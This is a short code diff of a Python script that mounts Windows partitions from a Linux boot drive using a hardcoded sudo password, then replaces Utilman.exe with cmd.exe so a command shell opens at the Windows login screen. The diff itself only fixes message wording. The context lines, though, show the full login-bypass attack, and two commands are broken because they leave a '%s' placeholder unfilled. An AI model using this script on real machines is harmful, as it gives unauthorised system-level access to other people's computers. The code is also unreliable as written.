@@ -21,9 +21,9 @@ def parse(file_name):
 def look_for_windows(list):
     for drive in drives_list:
         os.system('echo %s|sudo -S mount /dev/%s' % ('toor', drive))
-        print('CHecking for Windows on '+drive+'...\n')
+        print('Checking for Windows on '+drive+'...\n')
         if os.path.isdir('/media/Windows/Windows'):
-            print('Found Windows in '+drive+' and mounted it in /media/Windows')
+            print('Found Windows in '+drive+' and mounted it at /media/Windows')
             return drive
     return False
 
@@ -32,7 +32,7 @@ drives_list = parse("result.txt")
 if look_for_windows(drives_list):
     os.system('echo %s|sudo -S mv /media/Windows/Windows/System32/Utilman.exe /media/Windows/Windows/System32/Utilman.bak')
     os.system('echo %s|sudo -S mv /media/Windows/Windows/System32/cmd.exe /media/Windows/Windows/System32/Utilman.exe')
-    print('cmd.exe modifié. Rebooting now')
+    print('cmd.exe modified. Rebooting now')
 else:
     print('no windows found on this machine, don\'t forget to take out the flash drive')
 
